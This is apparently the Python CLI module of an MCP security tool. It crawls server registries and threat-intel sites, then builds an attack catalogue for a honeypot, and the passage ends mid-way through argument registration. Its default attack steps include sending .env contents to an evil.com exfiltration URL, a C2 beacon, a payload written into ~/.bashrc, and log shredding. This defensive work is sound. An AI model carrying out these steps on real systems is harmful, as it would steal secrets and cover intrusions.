# Cron setup on Hetzner: 0 3 * * 0 navil crawl threat-scan
"""Crawl command -- discover MCP servers from public registries and threat intel sources.

Extended commands:
  navil crawl registries         — discover MCP servers
  navil crawl schedule           — set up recurring scan
  navil crawl run-scan           — run a one-off full scan pipeline
  navil crawl threat-scan        — crawl threat intel sources for novel attack vectors
  navil crawl ingest-daily       — ingest daily_threats/YYYY-MM-DD.yaml into public_attacks.yaml
  navil crawl history            — show scan history
  navil crawl diff <s1> <s2>     — compare two scans
  navil crawl trend              — show trend over recent scans
  navil crawl trend-report       — generate publishable trend report
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
from pathlib import Path

import orjson


def _crawl_registries_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl registries`."""
    from navil.crawler.registry_crawler import RegistryCrawler

    limit = args.limit or 0
    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"Crawling registries (limit={limit or 'unlimited'})...")

    crawler = RegistryCrawler(limit=limit)
    results = asyncio.run(crawler.crawl())

    if not results:
        print("No servers discovered.", file=sys.stderr)
        return 1

    # Write each result as a JSON file
    for i, r in enumerate(results):
        fname = f"{r.source}_{i:04d}.json"
        path = output_dir / fname
        path.write_bytes(orjson.dumps(r.to_dict(), option=orjson.OPT_INDENT_2))

    print(f"Discovered {len(results)} servers, written to {output_dir}/")
    return 0


# ── Schedule command ──────────────────────────────────────────


def _schedule_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl schedule`."""
    from navil.crawler.scheduler import (
        generate_crontab_entry,
        generate_systemd_timer,
        run_async_scheduler,
        run_daemon,
    )

    interval = args.interval
    mode = args.mode

    if mode == "daemon":
        print(f"Starting scan daemon (interval={interval})...")
        print("Press Ctrl+C to stop.")
        run_daemon(
            interval,
            limit=args.limit,
            timeout_per_scan=args.timeout,
            webhook_url=args.webhook,
        )
        return 0

    elif mode == "async":
        print(f"Starting async scan scheduler (interval={interval})...")
        print("Press Ctrl+C to stop.")

        # Set up Redis client if URL provided
        redis_client = None
        redis_url = getattr(args, "redis_url", None)
        if redis_url:
            try:
                import redis.asyncio as aioredis

                redis_client = aioredis.from_url(redis_url)
                print(f"Redis lock enabled: {redis_url}")
            except Exception as exc:
                print(f"Warning: Could not connect to Redis ({exc}). Running without lock.")

        try:
            asyncio.run(
                run_async_scheduler(
                    interval,
                    limit=args.limit,
                    timeout_per_scan=args.timeout,
                    webhook_url=args.webhook,
                    slack_webhook_url=getattr(args, "slack_webhook", None),
                    redis_client=redis_client,
                    feed_to_cloud=getattr(args, "feed_to_cloud", False),
                )
            )
        except KeyboardInterrupt:
            print("\nScheduler stopped.")
        return 0

    elif mode == "crontab":
        entry = generate_crontab_entry(
            interval,
            limit=args.limit,
            timeout_per_scan=args.timeout,
        )
        print("Add this line to your crontab (crontab -e):")
        print()
        print(f"  {entry}")
        print()
        return 0

    elif mode == "systemd":
        units = generate_systemd_timer(
            interval,
            limit=args.limit,
            timeout_per_scan=args.timeout,
        )
        print("=== navil-scan.service ===")
        print(units["service"])
        print("=== navil-scan.timer ===")
        print(units["timer"])
        print("Install with:")
        print("  sudo cp navil-scan.service navil-scan.timer /etc/systemd/system/")
        print("  sudo systemctl enable --now navil-scan.timer")
        return 0

    else:
        print(f"Unknown mode: {mode}", file=sys.stderr)
        return 1


# ── Run-scan command ──────────────────────────────────────────


def _run_scan_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl run-scan`."""
    from navil.crawler.scheduler import run_full_scan

    print("Running full scan pipeline (crawl + scan + store)...")
    result = run_full_scan(
        limit=args.limit,
        timeout_per_scan=args.timeout,
        webhook_url=getattr(args, "webhook", None),
    )

    if result.get("status") == "no_servers":
        print("No servers discovered from registries.", file=sys.stderr)
        return 1

    print("\nScan complete:")
    print(f"  Scan ID:    {result.get('scan_id')}")
    print(f"  Discovered: {result.get('servers_discovered', 0)} servers")
    stats = result.get("stats", {})
    print(f"  Successful: {stats.get('successful', 0)}")
    print(f"  Failed:     {stats.get('failed', 0)}")
    print(f"  Timed out:  {stats.get('timed_out', 0)}")
    print(f"  Elapsed:    {result.get('elapsed_seconds', 0):.1f}s")

    if args.json:
        print("\n" + json.dumps(result, indent=2))

    return 0


# ── History command ───────────────────────────────────────────


def _history_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl history`."""
    from navil.crawler.scan_history import ScanHistoryStore

    store = ScanHistoryStore()
    scans = store.get_scan_history(limit=args.limit)

    if not scans:
        print("No scan history found.")
        return 0

    if args.json:
        print(json.dumps([s.to_dict() for s in scans], indent=2))
        return 0

    print(
        f"{'ID':>4s}  {'Date':>10s}  {'Servers':>7s}  {'OK':>4s}  {'Fail':>4s}  {'Avg Score':>9s}"
    )
    print("-" * 50)
    for s in scans:
        ts = s.timestamp[:10] if len(s.timestamp) >= 10 else s.timestamp
        print(
            f"{s.scan_id:4d}  {ts:>10s}  {s.total_servers:7d}  "
            f"{s.successful:4d}  {s.failed:4d}  {s.avg_score:9.1f}"
        )

    return 0


# ── Diff command ──────────────────────────────────────────────


def _diff_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl diff <scan1> <scan2>`."""
    from navil.crawler.scan_history import ScanHistoryStore
    from navil.report.scan_diff import generate_scan_diff, render_scan_diff_markdown

    store = ScanHistoryStore()
    diff = generate_scan_diff(store, args.scan1, args.scan2)

    if "error" in diff:
        print(f"Error: {diff['error']}", file=sys.stderr)
        return 1

    if args.json:
        print(json.dumps(diff, indent=2))
    else:
        md = render_scan_diff_markdown(diff)
        if args.output:
            Path(args.output).write_text(md)
            print(f"Diff report written to: {args.output}")
        else:
            print(md)

    return 0


# ── Trend command ─────────────────────────────────────────────


def _trend_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl trend`."""
    from navil.crawler.scan_history import ScanHistoryStore
    from navil.report.trend_analyzer import TrendAnalyzer

    store = ScanHistoryStore()
    analyzer = TrendAnalyzer(store)

    if args.server:
        data = analyzer.analyze_server(args.server, last_n=args.last)
    else:
        data = analyzer.analyze(last_n=args.last)

    if args.json:
        print(json.dumps(data, indent=2))
    else:
        md = analyzer.render_markdown(data)
        if args.output:
            Path(args.output).write_text(md)
            print(f"Trend report written to: {args.output}")
        else:
            print(md)

    return 0


# ── Trend report command ─────────────────────────────────────


def _trend_report_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl trend-report`."""
    from navil.crawler.scan_history import ScanHistoryStore
    from navil.report.trend_report import generate_trend_report, render_trend_report_markdown

    store = ScanHistoryStore()
    report = generate_trend_report(store, last_n=args.last)

    if args.json:
        print(json.dumps(report, indent=2))
    else:
        md = render_trend_report_markdown(report)
        if args.output:
            Path(args.output).write_text(md)
            print(f"Trend report written to: {args.output}")
        else:
            print(md)

    return 0


# ── Threat intel sources ──────────────────────────────────────

THREAT_INTEL_SOURCES: list[dict[str, str | list[str]]] = [
    {
        "name": "arXiv",
        "url_pattern": "https://arxiv.org/search/?query=MCP+attack&searchtype=all&categories=cs.CR+cs.AI",
        "keywords": [
            "MCP",
            "model context protocol",
            "prompt injection",
            "agent attack",
            "LLM security",
        ],
    },
    {
        "name": "GitHub Advisory Database",
        "url_pattern": "https://github.com/advisories?query=MCP+server",
        "keywords": ["CVE", "advisory", "MCP", "tool server", "vulnerability"],
    },
    {
        "name": "GitHub Search",
        "url_pattern": "https://github.com/search?q=MCP+exploit+attack&type=repositories",
        "keywords": ["exploit", "attack", "MCP", "proof of concept", "security tool"],
    },
    {
        "name": "Invariant Labs Blog",
        "url_pattern": "https://invariantlabs.ai/blog",
        "keywords": ["MCP", "agent", "security", "vulnerability", "attack vector"],
    },
    {
        "name": "Trail of Bits Blog",
        "url_pattern": "https://blog.trailofbits.com",
        "keywords": ["MCP", "LLM", "agent", "supply chain", "security"],
    },
    {
        "name": "HuggingFace Reports",
        "url_pattern": "https://huggingface.co/blog?tag=security",
        "keywords": ["model", "security", "attack", "adversarial", "poisoning"],
    },
    {
        "name": "NIST NVD",
        "url_pattern": "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=MCP+server",
        "keywords": ["CVE", "NVD", "MCP", "tool server", "protocol"],
    },
]


def _dedup_against_existing(
    new_descriptions: list[dict[str, str]],
    existing_vectors_path: str | None = None,
) -> list[dict[str, str]]:
    """Deduplicate new discoveries against existing vectors using keyword overlap.

    Each item in new_descriptions should have at least 'description' and 'source' keys.
    Returns only items that are considered novel.
    """
    import os

    import yaml

    # Load existing vectors
    existing_descriptions: list[str] = []
    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    discovered_path = existing_vectors_path or os.path.join(data_dir, "discovered_vectors.yaml")

    if os.path.exists(discovered_path):
        with open(discovered_path) as f:
            data = yaml.safe_load(f)
            if data and isinstance(data, dict):
                for vec in data.get("vectors", []):
                    existing_descriptions.append(vec.get("description", "").lower())

    # Also check public_attacks.yaml
    public_path = os.path.join(data_dir, "public_attacks.yaml")
    if os.path.exists(public_path):
        with open(public_path) as f:
            data = yaml.safe_load(f)
            if data and isinstance(data, dict):
                for atk in data.get("attacks", []):
                    existing_descriptions.append(atk.get("description", "").lower())

    # Deduplicate by keyword overlap
    novel: list[dict[str, str]] = []
    for item in new_descriptions:
        desc_lower = item.get("description", "").lower()
        desc_words = set(desc_lower.split())
        is_dup = False
        for existing in existing_descriptions:
            existing_words = set(existing.split())
            if not desc_words or not existing_words:
                continue
            overlap = len(desc_words & existing_words)
            # Consider duplicate if > 60% keyword overlap
            min_len = min(len(desc_words), len(existing_words))
            if min_len > 0 and overlap / min_len > 0.6:
                is_dup = True
                break
        if not is_dup:
            novel.append(item)
    return novel


def _fetch_source_results(source: dict[str, str | list[str]]) -> list[dict[str, str]]:
    """Fetch and parse results from a single threat intel source.

    Returns a list of dicts with 'description', 'source', and 'url' keys.
    """
    import urllib.request

    name = source["name"]
    url = str(source["url_pattern"])

    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Navil-ThreatIntel/1.0")
        if name == "NIST NVD":
            req.add_header("Accept", "application/json")
        if name == "GitHub Advisory Database":
            req = urllib.request.Request(
                "https://api.github.com/advisories?type=reviewed&ecosystem=npm&per_page=30",
                method="GET",
            )
            req.add_header("User-Agent", "Navil-ThreatIntel/1.0")
            req.add_header("Accept", "application/vnd.github+json")
        timeout = 45 if name == "arXiv" else 20
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
    except Exception as exc:
        print(f"  Warning: Could not fetch {name}: {exc}")
        return []

    keywords = [k.lower() for k in source.get("keywords", [])]
    results: list[dict[str, str]] = []

    if name == "NIST NVD":
        results = _parse_nvd_json(body, keywords)
    elif name == "GitHub Advisory Database":
        results = _parse_github_advisories(body, keywords)
    elif name == "arXiv":
        results = _parse_arxiv(body, keywords)
    elif name in ("Invariant Labs Blog", "Trail of Bits Blog", "HuggingFace Reports"):
        results = _parse_blog_html(body, str(name), url, keywords)
    elif name == "GitHub Search":
        results = _parse_github_search(body, keywords)

    return results


def _keyword_match(text: str, keywords: list[str], threshold: int = 2) -> bool:
    """Return True if text contains at least `threshold` keywords."""
    text_lower = text.lower()
    return sum(1 for kw in keywords if kw in text_lower) >= threshold


def _parse_nvd_json(body: str, keywords: list[str]) -> list[dict[str, str]]:
    """Parse NIST NVD REST API JSON response for MCP-related CVEs."""
    import json as _json

    results: list[dict[str, str]] = []
    try:
        data = _json.loads(body)
    except _json.JSONDecodeError:
        return results

    for item in data.get("vulnerabilities", [])[:50]:
        cve = item.get("cve", {})
        cve_id = cve.get("id", "")
        descriptions = cve.get("descriptions", [])
        desc_text = ""
        for d in descriptions:
            if d.get("lang") == "en":
                desc_text = d.get("value", "")
                break
        if not desc_text:
            continue

        combined = f"{cve_id} {desc_text}"
        if _keyword_match(combined, keywords):
            # Extract CVSS score if available
            metrics = cve.get("metrics", {})
            cvss_score = ""
            for metric_key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                metric_list = metrics.get(metric_key, [])
                if metric_list:
                    cvss_score = str(metric_list[0].get("cvssData", {}).get("baseScore", ""))
                    break

            severity = "medium"
            if cvss_score:
                try:
                    score = float(cvss_score)
                    if score >= 9.0:
                        severity = "critical"
                    elif score >= 7.0:
                        severity = "high"
                    elif score >= 4.0:
                        severity = "medium"
                    else:
                        severity = "low"
                except ValueError:
                    pass

            results.append(
                {
                    "description": f"[{cve_id}] (CVSS {cvss_score or '?'}, {severity}) {desc_text}",
                    "source": "NIST NVD",
                    "url": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                }
            )

    return results


def _parse_github_advisories(body: str, keywords: list[str]) -> list[dict[str, str]]:
    """Parse GitHub Security Advisories API JSON response."""
    import json as _json

    results: list[dict[str, str]] = []
    try:
        advisories = _json.loads(body)
    except _json.JSONDecodeError:
        return results

    if not isinstance(advisories, list):
        return results

    for adv in advisories[:30]:
        summary = adv.get("summary", "")
        description = adv.get("description", "")
        ghsa_id = adv.get("ghsa_id", "")
        cve_id = adv.get("cve_id", "") or ""
        severity = adv.get("severity", "unknown")
        html_url = adv.get("html_url", "")

        combined = f"{summary} {description} {cve_id}"
        if _keyword_match(combined, keywords):
            label = cve_id or ghsa_id
            results.append(
                {
                    "description": f"[{label}] ({severity}) {summary}. {description[:300]}",
                    "source": "GitHub Advisory Database",
                    "url": html_url or f"https://github.com/advisories/{ghsa_id}",
                }
            )

    return results


def _parse_arxiv(body: str, keywords: list[str]) -> list[dict[str, str]]:
    """Parse arXiv search results HTML for relevant security papers."""
    import re

    results: list[dict[str, str]] = []

    # arXiv search results have <li class="arxiv-result"> blocks
    # Extract title and abstract from each
    paper_blocks = re.findall(r'<li\s+class="arxiv-result">(.*?)</li>', body, re.DOTALL)

    for block in paper_blocks[:20]:
        # Extract title
        title_match = re.search(
            r'<p\s+class="title\s+is-5\s+mathjax">\s*(.*?)\s*</p>', block, re.DOTALL
        )
        title = re.sub(r"<[^>]+>", "", title_match.group(1)).strip() if title_match else ""

        # Extract abstract
        abstract_match = re.search(
            r'<span\s+class="abstract-full[^"]*"[^>]*>(.*?)(?:<a|$)', block, re.DOTALL
        )
        if not abstract_match:
            abstract_match = re.search(
                r'<p\s+class="abstract\s+mathjax">\s*<span[^>]*>.*?</span>\s*(.*?)</p>',
                block,
                re.DOTALL,
            )
        abstract = (
            re.sub(r"<[^>]+>", "", abstract_match.group(1)).strip()[:500] if abstract_match else ""
        )

        # Extract paper URL
        url_match = re.search(r'href="(https://arxiv\.org/abs/[\d.]+)"', block)
        paper_url = url_match.group(1) if url_match else ""

        combined = f"{title} {abstract}"
        if title and _keyword_match(combined, keywords):
            results.append(
                {
                    "description": f"{title}. {abstract[:300]}",
                    "source": "arXiv",
                    "url": paper_url,
                }
            )

    return results


def _parse_blog_html(
    body: str, source_name: str, base_url: str, keywords: list[str]
) -> list[dict[str, str]]:
    """Generic blog HTML parser — extracts article titles and links."""
    import re
    from urllib.parse import urljoin

    results: list[dict[str, str]] = []

    # Look for article/post links with titles
    # Common patterns: <a href="..."><h2>Title</h2></a>, <h2><a href="...">Title</a></h2>,
    # <article>...<a href="...">Title</a>...</article>
    patterns = [
        # <h2/h3><a href="URL" or href=URL>TITLE</a></h2/h3>
        r'<h[23][^>]*>\s*<a[^>]+href=["\']?([^"\'\s>]+)["\']?[^>]*>(.*?)</a>\s*</h[23]>',
        # <a href="URL">...<h2/h3>TITLE</h2/h3>...</a>
        r'<a[^>]+href=["\']?([^"\'\s>]+)["\']?[^>]*>.*?<h[23][^>]*>(.*?)</h[23]>',
        # <a href="URL" class="...post/article...">TITLE</a>
        r'<a[^>]+href=["\']?([^"\'\s>]+)["\']?[^>]*class="[^"]*(?:post|article|blog|entry)[^"]*"[^>]*>(.*?)</a>',
    ]

    seen_urls: set[str] = set()
    for pattern in patterns:
        for match in re.finditer(pattern, body, re.DOTALL | re.IGNORECASE):
            href = match.group(1)
            title = re.sub(r"<[^>]+>", "", match.group(2)).strip()
            if not title or len(title) < 10 or len(title) > 300:
                continue

            full_url = urljoin(base_url, href)
            if full_url in seen_urls:
                continue
            seen_urls.add(full_url)

            if _keyword_match(title, keywords, threshold=1):
                results.append(
                    {
                        "description": title,
                        "source": source_name,
                        "url": full_url,
                    }
                )

    return results


def _parse_github_search(body: str, keywords: list[str]) -> list[dict[str, str]]:
    """Parse GitHub repository search results HTML."""
    import re

    results: list[dict[str, str]] = []

    # GitHub search results contain repo links and descriptions
    repo_blocks = re.findall(
        r'<a[^>]+href="(/[^/]+/[^/"]+)"[^>]*class="[^"]*v-align-middle[^"]*"[^>]*>(.*?)</a>',
        body,
        re.DOTALL,
    )

    # Also try data-testid pattern used in newer GitHub UI
    if not repo_blocks:
        repo_blocks = re.findall(
            r'<a[^>]+href="(/[^/]+/[^/"]+)"[^>]*>([\w\-./]+)</a>',
            body,
            re.DOTALL,
        )

    seen: set[str] = set()
    for href, name in repo_blocks[:20]:
        repo_path = href.strip("/")
        if repo_path in seen or repo_path.count("/") != 1:
            continue
        seen.add(repo_path)

        name_clean = re.sub(r"<[^>]+>", "", name).strip()

        # Look for description near this repo link
        desc_match = re.search(
            rf'{re.escape(href)}.*?<p[^>]*class="[^"]*(?:description|mb-1)[^"]*"[^>]*>(.*?)</p>',
            body,
            re.DOTALL,
        )
        desc_text = re.sub(r"<[^>]+>", "", desc_match.group(1)).strip()[:300] if desc_match else ""

        combined = f"{name_clean} {desc_text}"
        if _keyword_match(combined, keywords, threshold=1):
            results.append(
                {
                    "description": f"{name_clean}: {desc_text}" if desc_text else name_clean,
                    "source": "GitHub Search",
                    "url": f"https://github.com/{repo_path}",
                }
            )

    return results


def _threat_scan_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl threat-scan`."""
    import os
    from datetime import datetime, timezone

    import yaml

    print("Scanning threat intel sources for novel attack vectors...")
    print(f"Sources: {len(THREAT_INTEL_SOURCES)}")
    print()

    all_discoveries: list[dict[str, str]] = []
    for source in THREAT_INTEL_SOURCES:
        name = source["name"]
        print(f"  Crawling {name}...")
        results = _fetch_source_results(source)
        if results:
            print(f"    Found {len(results)} candidates")
            all_discoveries.extend(results)
        else:
            print("    No results")

    if not all_discoveries:
        print("\nNo new attack vectors discovered.")
        return 0

    # Dedup against existing vectors
    novel = _dedup_against_existing(all_discoveries)
    print(f"\nNovel vectors after dedup: {len(novel)} (from {len(all_discoveries)} candidates)")

    if not novel:
        print("All discovered vectors already known.")
        return 0

    # Append to discovered_vectors.yaml
    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(data_dir, exist_ok=True)
    discovered_path = os.path.join(data_dir, "discovered_vectors.yaml")

    existing_data: dict[str, list[dict[str, str]]] = {"vectors": []}
    if os.path.exists(discovered_path):
        with open(discovered_path) as f:
            loaded = yaml.safe_load(f)
            if loaded and isinstance(loaded, dict):
                existing_data = loaded

    timestamp = datetime.now(timezone.utc).isoformat()
    for vec in novel:
        vec["discovered_at"] = timestamp
        existing_data["vectors"].append(vec)

    with open(discovered_path, "w") as f:
        yaml.dump(existing_data, f, default_flow_style=False, sort_keys=False)

    print(f"Appended {len(novel)} vectors to {discovered_path}")
    return 0


# ── Daily threat ingest ───────────────────────────────────────

# Maps daily_threats category strings (from safemcp/categories.py snake_case)
# to the ALLCAPS keys used in public_attacks.yaml / _CATEGORY_TO_GENERATOR.
_CATEGORY_MAP: dict[str, str] = {
    # Existing categories
    "prompt_injection": "DATA_EXFILTRATION",
    "data_exfiltration": "DATA_EXFILTRATION",
    "credential_access": "DATA_EXFILTRATION",
    "privilege_escalation": "PRIVILEGE_ESCALATION",
    "reconnaissance": "RECONNAISSANCE",
    "command_and_control": "COMMAND_AND_CONTROL",
    "supply_chain": "SUPPLY_CHAIN",
    "denial_of_service": "RATE_SPIKE",
    "lateral_movement": "LATERAL_MOVEMENT",
    "persistence": "PERSISTENCE",
    "defense_evasion": "DEFENSE_EVASION",
    "resource_hijacking": "RATE_SPIKE",
    "code_execution": "INFRA",
    "social_engineering": "DATA_EXFILTRATION",
    "configuration_tampering": "INFRA",
    "information_disclosure": "DATA_EXFILTRATION",
    # Agent-native categories
    "multimodal_smuggling": "DATA_EXFILTRATION",
    "handshake_hijacking": "HANDSHAKE",
    "rag_memory_poisoning": "RAG_POISON",
    "agent_collusion": "COLLUSION",
    "cognitive_exploitation": "COGNITIVE",
    "temporal_stateful": "TEMPORAL",
    "output_weaponization": "OUTPUT_WEAPON",
    "tool_schema_injection": "SUPPLY_CHAIN",
    "context_window_manipulation": "DATA_EXFILTRATION",
    "model_supply_chain": "SUPPLY_CHAIN",
    "cross_tenant_leakage": "DATA_EXFILTRATION",
    "delegation_abuse": "PRIVILEGE_ESCALATION",
    "feedback_loop_poisoning": "RAG_POISON",
    "covert_channel": "COVERT_CHANNEL",
}


def _ingest_daily_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
    """Handle `navil crawl ingest-daily`.

    Reads daily_threats/YYYY-MM-DD.yaml (today or --date), converts each threat
    into the public_attacks.yaml format, deduplicates against existing entries,
    and appends novel ones.  This is the missing link that makes auto-learning
    actually work: scheduled task → daily_threats/ → public_attacks.yaml →
    AttackVariantGenerator → honeypot.
    """
    import os
    from datetime import date

    import yaml

    data_dir = Path(os.path.dirname(__file__)).parent / "data"
    daily_dir = data_dir / "daily_threats"
    public_path = data_dir / "public_attacks.yaml"

    # Resolve which date file to ingest
    target_date = args.date or date.today().isoformat()
    daily_file = daily_dir / f"{target_date}.yaml"

    if not daily_file.exists():
        print(f"No daily threat file found: {daily_file}", flush=True)
        return 1

    with open(daily_file) as f:
        daily_data = yaml.safe_load(f)

    threats = daily_data.get("threats", [])
    if not threats:
        print(f"No threats in {daily_file}")
        return 0

    # Load existing public_attacks.yaml
    with open(public_path) as f:
        catalog = yaml.safe_load(f)
    existing_attacks: list[dict] = catalog.get("attacks", [])
    existing_names = {a["name"] for a in existing_attacks}
    existing_descs = [a.get("description", "").lower() for a in existing_attacks]

    added = 0
    skipped_dup = 0
    skipped_no_cat = 0

    for threat in threats:
        raw_cat = threat.get("category", "").lower().replace("-", "_")
        attack_name = threat.get("attack_name", "").lower().replace(" ", "_").replace("-", "_")
        # Slugify to valid YAML key
        import re

        attack_name = re.sub(r"[^\w]", "_", attack_name).strip("_")

        # Skip if name already exists
        if attack_name in existing_names:
            skipped_dup += 1
            continue

        # Dedup by description keyword overlap (same threshold as _dedup_against_existing)
        desc = threat.get("description", "")
        desc_words = set(desc.lower().split())
        is_dup = False
        for existing_desc in existing_descs:
            existing_words = set(existing_desc.split())
            if not desc_words or not existing_words:
                continue
            overlap = len(desc_words & existing_words)
            min_len = min(len(desc_words), len(existing_words))
            if min_len > 0 and overlap / min_len > 0.6:
                is_dup = True
                break
        if is_dup:
            skipped_dup += 1
            continue

        # Map category
        catalog_cat = _CATEGORY_MAP.get(raw_cat)
        if not catalog_cat:
            print(f"  Warning: unknown category '{raw_cat}' for '{attack_name}' — skipping")
            skipped_no_cat += 1
            continue

        severity = threat.get("severity", "medium").upper()

        # Build a minimal but valid attack_steps list based on category
        attack_steps = _default_steps_for_category(catalog_cat)

        # Build indicators from detection_approach text
        detection = threat.get("detection_approach", "")
        indicators = _extract_indicators(detection)

        # Build source_reference from sources list + marker
        sources = threat.get("sources", [])
        marker = threat.get("marker_2026", "")
        source_ref = sources[0] if sources else marker or f"navil-threat-research {target_date}"

        entry: dict = {
            "name": attack_name,
            "description": desc.strip(),
            "category": catalog_cat,
            "severity": severity,
            "attack_steps": attack_steps,
            "indicators": indicators,
            "source_reference": source_ref,
        }
        if threat.get("cve"):
            entry["cve"] = threat["cve"]

        existing_attacks.append(entry)
        existing_names.add(attack_name)
        existing_descs.append(desc.lower())
        added += 1
        print(f"  + {attack_name} [{catalog_cat}] {severity}")

    if added == 0:
        print(
            f"No new threats to add "
            f"(skipped {skipped_dup} duplicates, {skipped_no_cat} unknown categories)."
        )
        return 0

    # Write back
    catalog["attacks"] = existing_attacks
    with open(public_path, "w") as f:
        yaml.dump(catalog, f, default_flow_style=False, sort_keys=False, allow_unicode=True)

    total = len(existing_attacks)
    print(f"\nIngested {added} new threats into public_attacks.yaml ({total} total).")
    print(f"Skipped: {skipped_dup} duplicates, {skipped_no_cat} unknown categories.")
    return 0


def _default_steps_for_category(cat: str) -> list[dict]:
    """Return minimal representative attack_steps for a category."""
    _steps: dict[str, list[dict]] = {
        "SUPPLY_CHAIN": [
            {
                "method": "tools/call",
                "tool": "inject_backdoor",
                "target_server": "http://mcp-server:3000",
            }
        ],
        "DATA_EXFILTRATION": [
            {"method": "tools/call", "tool": "read_file", "args": {"path": ".env"}},
            {
                "method": "tools/call",
                "tool": "fetch_url",
                "args": {"url": "https://evil.com/exfil", "body": "$DATA"},
            },
        ],
        "RAG_POISON": [
            {"method": "tools/call", "tool": "db_read", "args": {"action": "embed_poison"}}
        ],
        "TEMPORAL": [
            {
                "method": "tools/call",
                "tool": "admin_panel",
                "args": {"action": "state_mutate_during_plan"},
            }
        ],
        "RATE_SPIKE": [
            {"method": "tools/call", "tool": "invoke", "args": {"repeat": 50}, "repeat": 50}
        ],
        "PERSISTENCE": [
            {
                "method": "tools/call",
                "tool": "write_file",
                "args": {"path": "~/.bashrc", "body": "$PAYLOAD"},
            }
        ],
        "PRIVILEGE_ESCALATION": [{"method": "tools/call", "tool": "credential_dump", "args": {}}],
        "RECONNAISSANCE": [{"method": "tools/list", "target": "*", "repeat": 8}],
        "LATERAL_MOVEMENT": [
            {
                "method": "tools/call",
                "tool": "api_call",
                "args": {"url": "http://internal-mcp/pivot"},
            }
        ],
        "DEFENSE_EVASION": [
            {
                "method": "tools/call",
                "tool": "run_script",
                "args": {"cmd": "shred -u /var/log/mcp.log"},
            }
        ],
        "COMMAND_AND_CONTROL": [
            {
                "method": "tools/call",
                "tool": "http_get",
                "args": {"url": "https://c2.evil.com/beacon"},
            }
        ],
        "HANDSHAKE": [
            {"method": "tools/call", "tool": "web_request", "args": {"action": "oauth_token_steal"}}
        ],
        "COLLUSION": [
            {"method": "tools/call", "tool": "api_call", "args": {"action": "relay_to_peer_agent"}}
        ],
        "COGNITIVE": [
            {"method": "tools/call", "tool": "query_db", "args": {"action": "inject_false_context"}}
        ],
        "OUTPUT_WEAPON": [
            {"method": "tools/call", "tool": "execute", "args": {"action": "weaponize_output"}}
        ],
        "INFRA": [{"method": "tools/call", "tool": "admin_console", "args": {"action": "rce"}}],
        "COVERT_CHANNEL": [
            {"method": "tools/call", "tool": "api_call", "args": {"action": "timing_side_channel"}}
        ],
    }
    return _steps.get(cat, [{"method": "tools/call", "tool": "unknown", "args": {}}])


def _extract_indicators(detection_text: str) -> list[str]:
    """Extract snake_case indicator names from a detection approach description."""
    import re

    # Pull out noun phrases that look like detector signals
    # Look for: "alert on X", "monitor for X", "detect X", "flag X"
    candidates: list[str] = []
    patterns = [
        r"alert on ([^;,\.]+)",
        r"monitor for ([^;,\.]+)",
        r"detect(?:ing)? ([^;,\.]+)",
        r"flag(?:ging)? ([^;,\.]+)",
        r"implement ([^;,\.]+)",
    ]
    for pat in patterns:
        for m in re.finditer(pat, detection_text, re.IGNORECASE):
            phrase = m.group(1).strip()
            # Slugify
            slug = re.sub(r"[^\w\s]", "", phrase).lower().strip()
            slug = re.sub(r"\s+", "_", slug)
            slug = slug[:60]  # cap length
            if slug:
                candidates.append(slug)

    # Deduplicate while preserving order, cap at 6
    seen: set[str] = set()
    result: list[str] = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            result.append(c)
        if len(result) >= 6:
            break

    return result or ["anomalous_tool_call_pattern"]


# ── Registration ──────────────────────────────────────────────


def register(subparsers: argparse._SubParsersAction, cli_class: type) -> None:
    """Register the crawl subcommand and its sub-subcommands."""
    crawl_parser = subparsers.add_parser("crawl", help="Crawl MCP registries and manage scans")
    crawl_sub = crawl_parser.add_subparsers(dest="crawl_command")

    # ── crawl registries ──────────────────────────────────────
    reg_parser = crawl_sub.add_parser("registries", help="Discover MCP servers from registries")
    reg_parser.add_argument(
        "--output",
        "-o",
        default="crawl_results",
        help="Output directory for crawl results (default: crawl_results/)",
    )
    reg_parser.add_argument(
        "--limit",
        type=int,
        default=0,
        help="Max number of servers to discover (0 = unlimited)",
    )
    reg_parser.set_defaults(func=lambda cli, args: _crawl_registries_command(cli, args))

    # ── crawl schedule ────────────────────────────────────────
    sched_parser = crawl_sub.add_parser(
        "schedule",
        help="Set up recurring scan schedule",
    )
    sched_parser.add_argument(
        "--interval",
        choices=["hourly", "daily", "weekly", "monthly"],
        default="weekly",
        help="Scan interval (default: weekly)",
    )
    sched_parser.add_argument(
        "--mode",
        choices=["daemon", "async", "crontab", "systemd"],
        default="crontab",
        help="Output mode: daemon (sync loop), async (asyncio with Redis lock), "
        "crontab (print entry), systemd (print units)",
    )
    sched_parser.add_argument(
        "--limit",
        type=int,
        default=0,
        help="Max servers per scan (0 = unlimited)",
    )
    sched_parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Timeout per individual scan in seconds (default: 30)",
    )
    sched_parser.add_argument(
        "--webhook",
        default=None,
        help="Webhook URL to notify after each scan completes",
    )
    sched_parser.add_argument(
        "--redis-url",
        default=None,
        help="Redis URL for distributed lock (e.g., redis://localhost:6379). "
        "Used with --mode async to prevent concurrent runs.",
    )
    sched_parser.add_argument(
        "--slack-webhook",
        default=None,
        help="Slack incoming webhook URL for error alerts",
    )
    sched_parser.add_argument(
